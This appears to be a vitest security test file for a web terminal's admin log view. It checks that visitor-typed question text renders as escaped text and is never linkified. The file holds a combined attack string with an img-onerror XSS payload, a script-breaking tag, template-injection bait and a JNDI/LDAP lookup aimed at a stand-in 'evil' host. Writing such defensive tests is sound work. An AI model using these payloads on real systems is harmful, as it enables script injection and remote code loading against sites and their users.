import { describe, expect, it } from "vitest";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { LogRenderer } from "../src/components/cafe/terminal/LogRenderer";
import { formatLogs } from "../src/components/cafe/terminal/adminCommands";
import { makeRawLine, makeLine } from "../src/components/cafe/terminal/terminalLines";

/**
 * THE HARD SECURITY GATE (blocking requirement for this story).
 *
 * Guest question text shown in the admin `logs` view is ATTACKER-CONTROLLED —
 * any visitor typed it. It MUST render as escaped literal text, NEVER as HTML,
 * and it must NEVER be linkified. This asserts against the real rendering path
 * (LogRenderer → verbatim text child), the exact DOM the terminal produces.
 */

/** A payload combining HTML injection, script-break, and template-literal bait. */
const ATTACK = `<img src=x onerror="alert(1)"></script>{{7*7}}` + "${jndi:ldap://evil}";

/** Render the given admin log lines to their real static markup. */
function renderLogs(html: string): string {
  const lines = formatLogs([{ t: Date.now(), q: html }], Date.now());
  return renderToStaticMarkup(createElement(LogRenderer, { lines }));
}

describe("admin logs — attacker-controlled question text is escaped, never HTML", () => {
  it("renders an <img onerror> payload as literal, escaped text", () => {
    const out = renderLogs(ATTACK);

    // The dangerous markup appears ESCAPED (React text child), not as a tag.
    expect(out).toContain("&lt;img src=x");
    expect(out).toContain("&lt;/script&gt;");

    // No LIVE element / event handler was ever emitted into the DOM.
    expect(out).not.toMatch(/<img[^>]*onerror/i);
    expect(out).not.toContain("</script>");

    // The literal characters are all preserved (nothing silently dropped).
    expect(out).toContain("alert(1)");
    expect(out).toContain("{{7*7}}");
    expect(out).toContain("${jndi:ldap://evil}");
  });

  it("does NOT linkify an allowlisted path embedded in a guest question", () => {
    // A normal (linkified) line WOULD turn /garage into an <a>. The verbatim
    // admin-log path must not — the attacker controls the text.
    const linkified = renderToStaticMarkup(
      createElement(LogRenderer, { lines: [makeLine("system", "see /garage")] }),
    );
    expect(linkified).toContain("<a "); // baseline: linkifier is active

    const verbatim = renderToStaticMarkup(
      createElement(LogRenderer, { lines: [makeRawLine("user", "see /garage")] }),
    );
    expect(verbatim).not.toContain("<a "); // admin log row: no link minted
    expect(verbatim).toContain("see /garage"); // text preserved
  });

  it("a full formatLogs row never emits an anchor or live tag", () => {
    const out = renderLogs("visit https://evil.example.com and /lobby now");
    expect(out).not.toContain("<a ");
    expect(out).toContain("https://evil.example.com");
  });
});
